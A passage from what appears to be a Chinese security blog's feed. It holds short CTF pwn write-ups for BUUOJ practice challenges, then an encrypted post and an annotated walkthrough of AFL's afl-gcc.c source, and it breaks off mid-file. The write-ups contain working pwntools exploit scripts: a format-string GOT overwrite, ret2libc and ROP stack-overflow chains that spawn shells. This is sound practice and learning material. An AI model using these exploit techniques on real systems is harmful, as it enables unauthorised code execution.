<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><p>格式化字符串，任意地址写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 思路一：格式化字符串改atoi为system，第二次读入&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">1atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line">p.recv()</span><br><span class="line">sl(payload)</span><br><span class="line">p.recv()</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br><span class="line"><span class="comment"># 思路二：改passwd 用fmstr_payload 需要指定架构</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = p32(0x0804C044)+p32(0x0804C045)+p32(0x0804C046)+p32(0x0804C047)+b&quot;%10$n%11$n%12$n%13$n&quot;</span></span><br><span class="line"><span class="comment"># 这一种改0x0804c044的随机值为0x10101010</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x0804c044</span>:<span class="number">0x666</span>&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">passwd = <span class="built_in">str</span>(<span class="number">0x666</span>)</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>read()溢出，有system和&#x2F;bin&#x2F;sh</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bin_sh = <span class="number">0x0804A024</span></span><br><span class="line">system = <span class="number">0x08048320</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br><span class="line">flag&#123;d935d6a8-444a-4bab-896f-32f177ac0db9&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>直接写入14个p32(17)就行了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,29574)</span><br><span class="line">[x] Opening connection to node5.buuoj.cn on port 29574</span><br><span class="line">[x] Opening connection to node5.buuoj.cn on port 29574: Trying 117.21.200.176</span><br><span class="line">[+] Opening connection to node5.buuoj.cn on port 29574: Done</span><br><span class="line">&gt;&gt;&gt; payload = p32(17)*14</span><br><span class="line">&gt;&gt;&gt; p.sendline(payload)</span><br><span class="line">&gt;&gt;&gt; p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><p>自己输入输入长度，溢出，有后门</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ru(<span class="string">b&#x27;[+]Please input the length of your name:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;32&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;[+]What\&#x27;s u name?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(<span class="number">0x4006e6</span>))</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p>strlen()有<code>&#39;\0&#39;</code>截断，所以在加密函数中可以直接跳出循环，然后打ret2libc即可</p>
<p>libc版本，buu上的64位2.27</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_plt = <span class="number">0x4006e0</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line">padding = <span class="number">0x50</span> + <span class="number">8</span> - <span class="number">1</span></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(<span class="number">0x4009a0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Input your choice!&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">puts_addr = l64()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base_addr = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = base_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*padding + p64(ret) + p64(pop_rdi) + p64(bin_sh) +p64(system) + p64(<span class="number">0</span>) </span><br><span class="line">ru(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>)</span><br><span class="line">sl(payload2)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h3 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h3><p>C语言代码伪代码要一行一行分析，分析循环跳出的条件</p>
<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><p>read()栈溢出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26824</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x4004c0</span></span><br><span class="line">bin_sh = <span class="number">0x600A90</span></span><br><span class="line">rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>) + p64(rdi) + p64(bin_sh) + p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2025/03/21/hello-world/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="565033cfbad0e25dd85edd49a3af67852a1a453d8356448553781d12c92411de">4630436162ade97ba2718b7d0c4b3b63f97fe7f487088031e1ec7f30c37889e17af4f6297068ec459b8609dd5e773f884c55009995b4e2fa14cd0ad5eff0ada9f9fb8fb348a39322f64a27b4e67198e9d0918355853825b4a8b859e1b0997d0838db13d93eb663a75abf26151a4cd6693bc3399e41eef6d4a0d8ac518bee9c9ddee4d733ecfde4f1c7c01610b2139c3f919d321e3580e4ea4d25333a1eb6a757138158c91746eb650d2bd292b639e6c34cbf144f87d98390fac9f8662146f06c3a6438c2b9ee94e1d311e783b3870047c72629be8369de61aafcfd95d1a6b146908a00176e823191858046b0d3068b0efa543f002c4411ac17d84cfbc5419db7d33e0dec60d5febc26877845ea4a0c78edbec57ec484cb94f4a5981b779247299a083552613550cf2067f03e18806e1d8b7363322598e505c747f93d1e38576db45e8de5d1770b452a4fb1219a730e7968e9f6fbb48dd64088b4f6b768d41ae0fde1188c840a5b26f4bcf87fc459371861bccf009fd56466bfb6189998e9e6a70ba3621ca8bdf949e5cadcc118f51f12983682d54b3fadc89599f99b3bc97b0ac705b13416a1e530d1e06e17469a74ffce4af1c9c1c3a7fe2e7d43f0a4553f309b55a680d4ba0eff5e1480ff40e6cca6cf09c8d0ab9d3d27139e5f1fa8ce760b2b398ec79fa2325ce353708b5fd4928897ec368d0027fa2da6b5a0fd8e4e9b7529ca09bebcdd4ee3a67b8793bf535765eccd25777435299c4f7eaac3b37aa14cd4e771f0d59050e41a2121cab03ed0afccb01338cfaa270444513ab17731861d2e4818cce309b9ff34abf619216411da184092968ba15dba46fd74305d671fcc251530f5b9827fa2b99f113bdb279c693dd1704ca3a9977b3cf3a9ef9e6e9aea7a55f4fc6fc7431430f1e9e124491e51c5a917d50a11cab0f41057afdd9d73a5b69b54cc67bafaa65d40dd533efc909c87f1c18ae04764a239ce69c0e6b19cc5ed2e7a78ac3ef08cb10b1f5b175a7d09c35fb03134919f9a86758fdb28838be1fac5331cdfa5707833518ca071974ca46fbdbf334145555a36a006404440d8fca60195baebf5d921d9ae64c6ede24c1ac47d7b3df82c3ce65f2f997606186ef07a3f88a8a3c72c8e7356c6e5c164a313008c552320c7cc95166d8e5e707dd2c9dbffb129a9ff70ff8101f09fb70b81f2e64efb235bd7a1a44978559875515a83368f1936fdc556832492ae0671d7b67a6d1103441d906adf08a33a54f41e0e0a81c7b4eac704aaa6c35e18d6dc5e7c207f526d5892197d5ec7c4dc0edc9efb23891b524cebecd0ce984f13642004ae7f4f54a08732b3ecd632161bc17cb1fd597809352045d72809c36c4bbd110a7497cabcf294feeb4d11fa9232188bee2584a68dfd88207a7cd9a48503570676e50847d192a2a6e7a3e53b1288974ea16d0d80073c728e0d84755ce47c943e600c17df7a43d591f7b8468bbefe1285a930632e3cc5655a628782afed132fd2656813b3e22325b3a48436551b12b4bb838771f30eb825dcd8fc754fd10a17f9662286af92f4f8894097e941fe3dbb4831cdbc6b443b1824d50b470da2542da6d87fa03706ed8a14dae9ea9870c7981bf761c813f8db6283e5e4d6f83a5a745ead7855a07cee619cc695b70f3df8b4b82f85ae49a93e0a2e86cb14d6e0f39d7f7bf03c28c6ca9e5390facd1c25ec8a080b42009a9e8e7a2661422d70a39b106406ace53b39d9f03ff1dc17e689135109c611b983c2627adbe1cf664ccb70961af510424ea592895cada1f8c387464a798fa7bccbf6c1194aee98de463a3b9d2dd218e14e3ae7e5d0c5f245cc7346d6e77b8485834290c726ad9b51e466d596aa6f3eda026257f794e43169d555593a6a2edff432c8fee45925e7e160535894a5c8cd682d47da0d6c0d453b6aabb3506802282bee599e6b9b05b39711c44af4661449bc4a5f0a6210b62bf1d925fa4ddd6119bf701a01d5697aca71cada1e1589a0292809eefc99ecf7cdfb7fdf6c58755e4056d96a320cf900212ea371469d77092e46fc449dfa62c7e239cba7cc11a68b343416c661aacab9576053516ad64f6d814c2ccc5e0f884262177421fc187ad171106677e25362053b1dfaf3886dc8836429ab3c84fd6e513de9ae09c0fa33f26d020910e61cf24436a5449543f2cd87c83075d5b6196c0906d9803c75158f3f735c9d5e676bff754f1624524fb3bb6ff74c7bc4efa5232f511f6b0101311503ca3f1f1e2d8896d2bba030c5ce2bfbe55caa42dc943bd894d3b4cb477545f75789e0319ffe57729a98b855a9714508a955c8320a1f26393e1f113062535a766a0467a50c0c9d56bc170e68453c016a231eb5723e8470065d0671efc61360e68506bf08024106b9f7ab456d894dfaf5b0a9b20c29411fbb86373522ac2d8c249cbb43844704009da10719c877b42ea5b0f29a1c857a6010f87cf67a5b6c17e7a692e14343826fdfcba7224f82ad67ab76ee82d6e6c764b155358cfcf2b474558e5368b62028c52c55ea61eff706ae8509a86649d409e3a033fffe63429d8f088985c99c2c574c6c8a8ee48f56d84a1bfbbc48250191029b02c8391e05a23f339dd8727457b77b17b9762d6a4f22a369776bfd3f185a9edcdab5b76017d1488457094eed536638b8565385fcab698c2e89b3ebcf1c5aafd80a54f225949b54174b691c1039aa90305bc2538c92411df088b15d3429a841fbe37b3372015181f4a30a3c1bc6e85539c4bd5a692da38b9e05aa69a2640ca4191cf46eb460bc72f5e6a03d98c5e5703e1971e237f10feca4fd1d6720a6631929b4150e2a1f24df54dfc3b94d0321be2001ddf5b8a7bc71b76e677157fe63fdf0e273af4dca56b9e3aba86fd2f893d1dc0c3ac64663868c19d50e6213033a6b4fac6dfbed7e3a01223421aa246a83db479a938f691c533a975b92477ed639b3aa7ace2b93f6402c6d8fc63504e5f383e07929e10a7839d1a9d17330a2883e68592eaba9a66f7ecf4d7c9778380a9acd2dbbaac5f6ded1f384077269489201d58495f66e6c2e14d6939fd0b56382986631a1b9eaefadce7cf27a8999bb34f675b5806d3c4ee96604468043783c027fa96f06ef3ec165fde40bd102c8</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>fuzz入门到入土</title>
    <url>/2025/09/16/FUZZ%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</url>
    <content><![CDATA[<p>由于一直对fuzz有一定的兴趣购买了<a href="https://blog.csdn.net/qq_41202237/category_11470526.html?fromshare=blogcolumn&sharetype=blogcolumn&sharerId=11470526&sharerefer=PC&sharesource=2302_80131259&sharefrom=from_link">hollk师傅的文章</a>来学习fuzz</p>
<h1 id="专题一：源码阅读"><a href="#专题一：源码阅读" class="headerlink" title="专题一：源码阅读"></a>专题一：源码阅读</h1><p>阅读大型C&#x2F;C++程序源码相关准备——明确目的</p>
<h2 id="afl-gcc-c"><a href="#afl-gcc-c" class="headerlink" title="afl-gcc.c"></a>afl-gcc.c</h2><p>借助gemin2.5pro给出的回答，仅供参考</p>
<blockquote>
<p>带着以下几个具体问题去阅读：</p>
<ul>
<li>main 函数是如何解析我们输入的命令行参数的？</li>
<li>代码是如何判断应该在背后调用 gcc 还是 clang 的？</li>
<li>关键函数 find_as 是如何找到 afl-as 这个程序的具体路径的？</li>
<li>**（核心中的核心）**edit_params 函数到底对我们输入的参数做了哪些修改？它是如何通过添加 -B 参数来告诉 gcc 去指定的目录寻找 afl-as 的？</li>
<li>除了替换汇编器，它还添加了哪些额外的参数？（提示：寻找与 afl-rt.o 相关的代码，这是AFL的运行时库）。</li>
</ul>
<p>在阅读工程中需要注意哪些重点</p>
<ul>
<li><strong>main 函数的整体逻辑</strong>：不要一开始就陷入细节，先看 main 函数的骨架，理解“找到 afl-as -&gt; 修改参数 -&gt; 执行真实编译器”这个大流程。</li>
<li><strong>find_as() 函数</strong>：注意它对环境变量 AFL_PATH 的处理。这有助于你理解 AFL 的安装和环境配置。</li>
<li><strong>edit_params() 函数</strong>：这是最重要的部分。请重点关注代码中为 cc_params 数组添加新成员的部分。特别是对 -B 参数的处理，你需要去理解 gcc 的 -B 选项的含义：“向 GCC 提供一个搜索路径，用于查找编译器执行程序、库和数据文件”。AFL 正是利用这一点，让 gcc 优先在 afl-as 所在的目录找到了汇编器。</li>
<li><strong>execvp() 函数</strong>：这是代码的最后一步，它用修改后的参数启动了真正的编译器。理解了它，整个 afl-gcc.c 的生命周期就闭环了</li>
</ul>
</blockquote>
<h3 id="main-函数"><a href="#main-函数" class="headerlink" title="main()函数"></a>main()函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Main entry point */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line">    SAYF(cCYA <span class="string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span></span><br><span class="line">         <span class="string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  find_as(argv[<span class="number">0</span>]); <span class="comment">//argv[0]一定是程序的名称，并且包含了程序所在的完整路径</span></span><br><span class="line"></span><br><span class="line">  edit_params(argc, argv);<span class="comment">/*argc 是什么: argument count（参数计数），一个整数，表示命令行参数的总个数（包括程序名本身）。</span></span><br><span class="line"><span class="comment">                            argv 是什么: argument vector（参数向量），一个字符串数组，包含了所有的命令行参数。</span></span><br><span class="line"><span class="comment">                             这是 afl-gcc 的核心功能。它会遍历原始的 argv 数组，然后创建一个新的参数数组，</span></span><br><span class="line"><span class="comment">                             这个新的数组就是全局变量 cc_params。</span></span><br><span class="line"><span class="comment">                             所以这个cc_params需要重点关注*/</span></span><br><span class="line"></span><br><span class="line">  execvp(cc_params[<span class="number">0</span>], (<span class="type">char</span>**)cc_params);</span><br><span class="line">  <span class="comment">//终止 afl-gcc 进程，并将其完全替换为一个新进程（即真正的 gcc 或 clang），同时让这个新进程带着经过特殊构造的参数列表来运行。</span></span><br><span class="line">  FATAL(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结一下只有三个重要的函数还有一个是系统函数</p>
<h3 id="find-as-argv-0-函数"><a href="#find-as-argv-0-函数" class="headerlink" title="find_as(argv[0])函数"></a>find_as(argv[0])函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Try to find our &quot;fake&quot; GNU assembler in AFL_PATH or at the location derived</span></span><br><span class="line"><span class="comment">   from argv[0]. If that fails, abort. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">find_as</span><span class="params">(u8* argv0)</span> &#123;</span><br><span class="line"></span><br><span class="line">  u8 *afl_path = getenv(<span class="string">&quot;AFL_PATH&quot;</span>);<span class="comment">//假设为 ./afl</span></span><br><span class="line">  u8 *slash, *tmp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (afl_path) &#123;</span><br><span class="line"></span><br><span class="line">    tmp = alloc_printf(<span class="string">&quot;%s/as&quot;</span>, afl_path);<span class="comment">// 功能如其名，返回值是堆块指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!access(tmp, X_OK)) &#123;<span class="comment">//检查当前程序是否有权限访问指定的文件或目录。X_OK执行权限。返回值：有:0;无:1</span></span><br><span class="line">      as_path = afl_path;</span><br><span class="line">      ck_free(tmp);</span><br><span class="line">      <span class="keyword">return</span>; <span class="comment">// ---&gt; 第一个返回点，如果./afl/as存在</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ck_free(tmp);</span><br><span class="line"></span><br><span class="line">  &#125;<span class="comment">// 获取AFL_PATH路径。检查路径是否可以访问</span></span><br><span class="line"></span><br><span class="line">  slash = <span class="built_in">strrchr</span>(argv0, <span class="string">&#x27;/&#x27;</span>);<span class="comment">// 从右往左查找第一个&#x27;/&#x27;--&gt; 结果/afl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (slash) &#123;</span><br><span class="line"></span><br><span class="line">    u8 *dir;</span><br><span class="line"></span><br><span class="line">    *slash = <span class="number">0</span>;<span class="comment">// 将&#x27;/&#x27;替换为字符串结束符，截断字符串</span></span><br><span class="line">    dir = ck_strdup(argv0);<span class="comment">// 复制截断后的字符串</span></span><br><span class="line">    *slash = <span class="string">&#x27;/&#x27;</span>;<span class="comment">// 恢复原始字符串</span></span><br><span class="line"></span><br><span class="line">    tmp = alloc_printf(<span class="string">&quot;%s/afl-as&quot;</span>, dir);<span class="comment">// 拼接路径--&gt; afl/afl-as</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!access(tmp, X_OK)) &#123;<span class="comment">// 检查路径是否可以访问</span></span><br><span class="line">      as_path = dir;</span><br><span class="line">      ck_free(tmp);</span><br><span class="line">      <span class="keyword">return</span>; <span class="comment">// ---&gt; 第二个返回点，如果./afl/afl-as存在</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ck_free(tmp);</span><br><span class="line">    ck_free(dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!access(AFL_PATH <span class="string">&quot;/as&quot;</span>, X_OK)) &#123;<span class="comment">// 检查默认路径是否可以访问</span></span><br><span class="line">    as_path = AFL_PATH;</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">//第三个返回点，（默认）标准安装路径 /usr/local/lib/afl/as</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果都不行，报错退出</span></span><br><span class="line">  FATAL(<span class="string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;<span class="comment">//走完这个函数最终更新了 as_path 中的内容</span></span><br></pre></td></tr></table></figure>

<h3 id="edit-params-函数"><a href="#edit-params-函数" class="headerlink" title="edit_params()函数"></a>edit_params()函数</h3><p>函数功能就是将执行的命令，如：<code>afl-gcc -O3 -o my_app my_app.c</code></p>
<p>最终得到的cc_params[]数组如：<code>[&quot;gcc&quot;, &quot;-O3&quot;, &quot;-o&quot;, &quot;my_app&quot;, &quot;my_app.c&quot;, &quot;-B&quot;, as_path, &quot;-g&quot;, &quot;-O3&quot;, &quot;-funroll-loops&quot;, &quot;-D__AFL_COMPILER=1&quot;, &quot;-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;, &quot;NULL&quot;]</code></p>
<p><img data-src="/../images/image-20250918170111499.png" alt="image-20250918170111499"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Copy argv to cc_params, making the necessary edits. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">edit_params</span><span class="params">(u32 argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">  u8 fortify_set = <span class="number">0</span>, asan_set = <span class="number">0</span>; <span class="comment">// 设置cc参数</span></span><br><span class="line">  u8 *name; <span class="comment">//指针</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">  u8 m32_set = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  cc_params = ck_alloc((argc + <span class="number">128</span>) * <span class="keyword">sizeof</span>(u8*)); <span class="comment">//为cc_params分配内存</span></span><br><span class="line">  <span class="comment">/*假设你在一台64位的电脑上执行命令：afl-gcc -O3 -o my_app my_app.c</span></span><br><span class="line"><span class="comment">    计算 argc:</span></span><br><span class="line"><span class="comment">    这个命令共有5个部分 (afl-gcc, -O3, -o, my_app, my_app.c)，所以 argc = 5。</span></span><br><span class="line"><span class="comment">    计算argc+128总数:</span></span><br><span class="line"><span class="comment">    argc + 128 = 5 + 128 = 133。</span></span><br><span class="line"><span class="comment">    我们需要一个能容纳 133 个指针的数组。</span></span><br><span class="line"><span class="comment">    计算每个“格子”的大小:</span></span><br><span class="line"><span class="comment">    因为是64位系统，sizeof(u8*) = 8 字节。</span></span><br><span class="line"><span class="comment">    计算总内存大小:</span></span><br><span class="line"><span class="comment">    总字节数 = 133 * 8 = 1064 字节*/</span></span><br><span class="line">    </span><br><span class="line">  name = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;/&#x27;</span>); <span class="comment">// 从右往左查找第一个&#x27;/&#x27;（后的编译器名称），使name指向&#x27;/&#x27;字符，如./afl-clang++ -o test test.cpp则argv[0]是./afl-clang</span></span><br><span class="line">  <span class="keyword">if</span> (!name) name = argv[<span class="number">0</span>]; <span class="keyword">else</span> name++;<span class="comment">// 如果没有&#x27;/&#x27;，直接使用argv[0].否则让name指向&#x27;/&#x27;后的第一个字符</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(name, <span class="string">&quot;afl-clang&quot;</span>, <span class="number">9</span>)) &#123;<span class="comment">// 如果是afl-clang则使用clang编译器</span></span><br><span class="line"></span><br><span class="line">    clang_mode = <span class="number">1</span>;<span class="comment">// 设置clang_mode为1</span></span><br><span class="line"></span><br><span class="line">    setenv(CLANG_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-clang++&quot;</span>)) &#123;<span class="comment">// 如果是afl-clang++，则使用clang++编译器</span></span><br><span class="line">      u8* alt_cxx = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);<span class="comment">// 获取环境变量AFL_CXX</span></span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;clang++&quot;</span>;<span class="comment">// 如果AFL_CXX存在则使用AFL_CXX，否则使用clang++</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = getenv(<span class="string">&quot;AFL_CC&quot;</span>);<span class="comment">// 获取环境变量AFL_CC</span></span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;clang&quot;</span>;<span class="comment">// 如果AFL_CC存在则使用AFL_CC，否则使用clang</span></span><br><span class="line">    &#125;<span class="comment">// cc_params[]是保存编译参数的数组</span></span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* With GCJ and Eclipse installed, you can actually compile Java! The</span></span><br><span class="line"><span class="comment">       instrumentation will work (amazingly). Alas, unhandled exceptions do</span></span><br><span class="line"><span class="comment">       not call abort(), so afl-fuzz would need to be modified to equate</span></span><br><span class="line"><span class="comment">       non-zero exit codes with crash conditions when working with Java</span></span><br><span class="line"><span class="comment">       binaries. Meh. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__<span class="comment">//如果不是以afl_clang开头，而是在苹果系统上,就会进入这个分支</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) cc_params[<span class="number">0</span>] = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) cc_params[<span class="number">0</span>] = getenv(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> cc_params[<span class="number">0</span>] = getenv(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!cc_params[<span class="number">0</span>]) &#123;</span><br><span class="line"></span><br><span class="line">      SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;On Apple systems, &#x27;gcc&#x27; is usually just a wrapper for clang. Please use the\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    &#x27;afl-clang&#x27; utility instead of &#x27;afl-gcc&#x27;. If you really have GCC installed,\n&quot;</span></span><br><span class="line">           <span 